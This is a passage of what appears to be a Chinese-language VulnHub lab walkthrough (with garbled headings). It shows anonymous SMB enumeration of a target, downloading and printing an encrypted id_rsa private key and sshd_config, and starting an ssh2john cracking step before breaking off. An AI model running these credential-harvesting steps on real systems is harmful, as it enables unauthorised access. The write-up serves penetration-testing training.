AAAAB3NzaC1yc2EAAAADAQABAAABAQCaOJE+/p4Y988V1I/soMH5RgdIavic3jBph74ZSUGWCf9I8mdmA6BszNd/QIxSbCXufb8r/yPMuoTDetJNXHyvb3RvPsSQ86N12G+ZaQATcGdf67S8WB+9vGJAPRxbbZiaokBjNXkGvAXs2mDhhtgiNjbnn3fb4KNvdeNJ/+xhZCRwknmKtf55zMgv2kFXFfmJO0kVogVYncnmsNohd0wJuImDJVHuGqvg9KmFCjb/gMhfh0jTIZB7cuseaKAzY8O2g4tMRNyVG5zwAmHkH0D00Du6ssXn1ZMCRq/imdDV7It1+L14d6bDTRCqm2FLRcKcx5PohJC1ElnzTkvhalEx smbuser@FileServer_CK10-test</span><br></pre></td></tr></table></figure><h2 id="0x06-æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº"><a href="#0x06-æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº" class="headerlink" title="0x06.æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº"></a>0x06.æµè§ˆSMBæœåŠ¡å™¨ç«¯æ‰€åˆ†äº«å‡ºæ¥çš„æ‰€æœ‰èµ„æº</h2><p><code>å¯ä»¥å‘ç°ä¸¤ä¸ªç›®å½•ä¸ºsmbdataã€smbuserï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸¤ä¸ªç”¨æˆ·</code></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtYmEub3JnL3NhbWJhL2RvY3MvY3VycmVudC9tYW4taHRtbC9zbWJjbGllbnQuMS5odG1s">smbclientå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient -L 192.168.1.14</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        smbdata         Disk      smbdata</span><br><span class="line">        smbuser         Disk      smbuser</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.9.1)</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x07-ç™»å…¥åˆ°æœåŠ¡ç«¯"><a href="#0x07-ç™»å…¥åˆ°æœåŠ¡ç«¯" class="headerlink" title="0x07.ç™»å…¥åˆ°æœåŠ¡ç«¯"></a>0x07.ç™»å…¥åˆ°æœåŠ¡ç«¯</h2><p><code>smbdataå¯ä»¥æŸ¥çœ‹ï¼Œsmbuserä¸å¯ä»¥æŸ¥çœ‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbdata</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Mar 19 00:53:12 2020</span><br><span class="line">  ..                                  D        0  Tue Feb 18 06:47:54 2020</span><br><span class="line">  anaconda                            D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  audit                               D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  boot.log                            N     6120  Tue Feb 18 06:48:16 2020</span><br><span class="line">  btmp                                N      384  Tue Feb 18 06:48:16 2020</span><br><span class="line">  cron                                N     4813  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg                               N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  glusterfs                           D        0  Tue Feb 18 06:48:16 2020</span><br><span class="line">  lastlog                             N   292292  Tue Feb 18 06:48:16 2020</span><br><span class="line">  maillog                             N     1982  Tue Feb 18 06:48:16 2020</span><br><span class="line">  messages                            N   684379  Tue Feb 18 06:48:17 2020</span><br><span class="line">  ppp                                 D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  samba                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  secure                              N    11937  Tue Feb 18 06:48:17 2020</span><br><span class="line">  spooler                             N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tallylog                            N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tuned                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  wtmp                                N    25728  Tue Feb 18 06:48:17 2020</span><br><span class="line">  xferlog                             N      100  Tue Feb 18 06:48:17 2020</span><br><span class="line">  yum.log                             N    10915  Tue Feb 18 06:48:17 2020</span><br><span class="line">  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020</span><br><span class="line">  todo                                N      162  Tue Feb 25 09:22:29 2020</span><br><span class="line">  id_rsa                              N     1766  Thu Mar 19 00:43:16 2020</span><br><span class="line">  note.txt                            N      128  Thu Mar 19 00:53:12 2020</span><br><span class="line"></span><br><span class="line">                19976192 blocks of size 1024. 18256884 blocks available</span><br><span class="line">smb: \&gt;</span><br><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbuser</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><p><code>ä¸‹è½½id_rsaä¸sshd_config</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get id_rsa</span><br><span class="line">getting file \id_rsa of size 1766 as id_rsa (143.7 KiloBytes/sec) (average 143.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get sshd_config</span><br><span class="line">getting file \sshd_config of size 3906 as sshd_config (1907.1 KiloBytes/sec) (average 395.6 KiloBytes/sec)</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç§é’¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id_rsa  nmap.CVT  nmap.sP  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat id_rsa </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,0111C403C183156C592743C68EA855BD</span><br><span class="line"></span><br><span class="line">TRNiuBMH2lIgWgYpBb4MgbhQtW84gdUTJDRQLp/qwBv/KTbycWu+R07J2lGEFJH8</span><br><span class="line">8G1nZ+bjnPayjTyywY5PGySQ4k5pWvmNin16TEAII7XO6Jv+/Ev/N4sPdKe7K3bN</span><br><span class="line">TpJ39S5DVuj4oTTswvUp3dYU6ynu3Qp9PBRdBJnazbK5hwkxOyqa5l1dCfRDpaWf</span><br><span class="line">hPM+GhXbHOvzj+Z9wvlrTuPASsBrCnXd/MAxRmNfDMCHlPHVATEChoP89awwoti5</span><br><span class="line">itxcxqIWGIqilnlm7Dcy2lynE7LlXdXyJAnUI0Plra9PTqC4QoJL3Lyesypzp9Xk</span><br><span class="line">kB9Hv25vherfgjy6AKBcIqZuALtFL2mij7nYC21XxcDudKCaB+UxOQhGBLNN0E16</span><br><span class="line">7bNvnKebLmhyWhDNVaelvF9cd+mxvvPzv5ljhUd3jvhhyU70AgzrpF1ZUxVh2GOs</span><br><span class="line">huzbtCIwX3I+xAQYdw+sThTRG8GcXLjreEUF4gJqlPNWk9gxH/AmfTmGKdLhhoSb</span><br><span class="line">/7wHeMvLwSRaVv6fyPXhPpiB5c3MHCoHFYi6sbmmtYXJBum9fF9iubIzlRu/4vZ2</span><br><span class="line">irmnsEff3vkqqPchb6M0zMtw80QPJgpjhclJjDPiI5P1DWjgLNYOQba0nKNQ3RFa</span><br><span class="line">iy2lup+EsCqWU0KTI+hH+Xm0YAq2/ESqPeNp/U+78y8L5JkpavRYNJyx+vGV8XPP</span><br><span class="line">dGkZD8x68xLIwF6/urZC6utRa1HgyEDIcUbyTUnbRkLUFWbN9eHLrY0pH+zhKJOj</span><br><span class="line">14cUAOpB9RkxAoE6YJ03vJq72OoxfCYhiv3fj4pQRuQJwA2c8IfgdwIJqBIMVPvV</span><br><span class="line">5HX3j5ugkyocLl5Rg+oXjyhNczmABJehk9gA0eCcfQpXGPw/OBMJ4BJdUHxbCOtQ</span><br><span class="line">lAstu+fNBosFhkj3lHXX/ZNIKcYs9+Mvs3E2DvmcK7Us/59qsCwHRZNvd2E3EF9r</span><br><span class="line">nNuHg8sY5HxMvMNH46PH8c4EesuNvOW2pvaCHCT5Id3Up1yyP09hoxyyovnPQ/Gj</span><br><span class="line">HXffEjkc82t9Ip476mfo0NBzB4g7sOb4ZXhG8RxHS4d83S5bITzHP8RrlmkdKCjH</span><br><span class="line">U5YMap/xQ++4XTtgX8DjVoZw1imRtNsCQk6fe0UVKzg2nFV8rkOU8A1o6NDcjE/Z</span><br><span class="line">V/PsYJT3CTEvlzq1/4lLQN2nLrpwmlu+Ate5CEmKxqDIpSIzQBl5N4cU5aa/L1XG</span><br><span class="line">2nFA4H1Ipo7CaUQZ3lQGC/wHaWcP0KnZQ/SrInGOQVu1RJe3MhyG3TyC06FVfmgV</span><br><span class="line">m4oqf39lGQlYX8+cTCK8w6nI6gnSsW92U9j5s9iGEZKN2bI1poyurQaExFiDub6m</span><br><span class="line">QzYWqY1+EUBUYzFMlR08TeHXLvoAmgJNcnZlhXuhWsl6z95UMKvRBLN3Dc4kIVZx</span><br><span class="line">sBZmlYhqhwl0AWYQOl1tJrOMiqLeMhF+xWZ3J/iZ9Pj37Dz9xL8YiA8YUNC/NqT+</span><br><span class="line">3j1s3USXPL0uyxS7tnJJf3aXMBi0XwwHWZg4ii8JQhGiiPhGBE9lpRyPhYCx3xDC</span><br><span class="line">ED/GW22/sWS5fhDr4tynP8VdjiFwbBEcXYHa84XjeUZZaLJQTSwnE/afWVYty8AX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat sshd_config </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#      $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the sshd server system-wide configuration file.  See</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshd_config(5) <span class="keyword">for</span> more information.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This sshd was compiled with PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The strategy used <span class="keyword">for</span> options <span class="keyword">in</span> the default sshd_config shipped with</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenSSH is to specify options with their default value <span class="built_in">where</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> possible, but leave them commented.  Uncommented options override the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default value.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want to change the port on a SELinux system, you have to tell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELinux about this change.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> semanage port -a -t ssh_port_t -p tcp <span class="comment">#PORTNUMBER</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Port 22</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress ::</span></span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_dsa_key</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ciphers and keying</span></span><br><span class="line"><span class="meta">#</span><span class="bash">RekeyLimit default none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SyslogFacility AUTH</span></span><br><span class="line">SyslogFacility AUTHPRIV</span><br><span class="line"><span class="meta">#</span><span class="bash">LogLevel INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LoginGraceTime 2m</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="bash">StrictModes yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxAuthTries 6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxSessions 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">PubkeyAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> but this is overridden so installations will only check .ssh/authorized_keys</span></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedPrincipalsFile none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommand none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommandUser nobody</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For this to work you will also need host keys <span class="keyword">in</span> /etc/ssh/ssh_known_hosts</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostbasedAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to yes <span class="keyword">if</span> you don<span class="string">&#x27;t trust ~/.ssh/known_hosts for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HostbasedAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreUserKnownHosts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t read the user&#x27;</span>s ~/.rhosts and ~/.shosts files</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreRhosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">disable</span> tunneled clear text passwords, change to no here!</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PasswordAuthentication yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitEmptyPasswords no</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> s/key passwords</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChallengeResponseAuthentication yes</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Kerberos options</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosTicketCleanup yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosGetAFSToken no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosUseKuserok yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> GSSAPI options</span></span><br><span class="line">GSSAPIAuthentication yes</span><br><span class="line">GSSAPICleanupCredentials no</span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIStrictAcceptorCheck yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIKeyExchange no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIEnablek5users no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set this to <span class="string">&#x27;yes&#x27;</span> to <span class="built_in">enable</span> PAM authentication, account processing,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the setting of <span class="string">&quot;PermitRootLogin without-password&quot;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication, <span class="keyword">then</span> <span class="built_in">enable</span> this but <span class="built_in">set</span> PasswordAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and ChallengeResponseAuthentication to <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: <span class="string">&#x27;UsePAM no&#x27;</span> is not supported <span class="keyword">in</span> Red Hat Enterprise Linux and may cause several</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> problems.</span></span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowAgentForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowTcpForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GatewayPorts no</span></span><br><span class="line">X11Forwarding yes</span><br><span class="line"><span class="meta">#</span><span class="bash">X11DisplayOffset 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11UseLocalhost yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTTY yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintMotd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintLastLog yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TCPKeepAlive yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseLogin no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UsePrivilegeSeparation sandbox</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitUserEnvironment no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Compression delayed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ShowPatchLevel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseDNS yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PidFile /var/run/sshd.pid</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxStartups 10:30:100</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTunnel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChrootDirectory none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VersionAddendum none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no default banner path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Banner none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Accept locale-related environment variables</span></span><br><span class="line">AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES</span><br><span class="line">AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT</span><br><span class="line">AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE</span><br><span class="line">AcceptEnv XMODIFIERS</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> override default of no subsystems</span></span><br><span class="line">Subsystem       sftp    /usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Match User anoncvs</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       AllowTcpForwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       PermitTTY no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       ForceCommand cvs server</span></span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x08-johnç ´è§£"><a href="#0x08-johnç ´è§£" class="headerlink" title="0x08.johnç ´è§£"></a>0x08.johnç ´è§£</h2><p><code>å…ˆhashid_rsa</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydW9uZ2ttYS9jdGYtdG9vbHMvYmxvYi9tYXN0ZXIvSm9obi9ydW4vc3Nobmcyam9obi5weQ==">toolsåœ°å€<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span 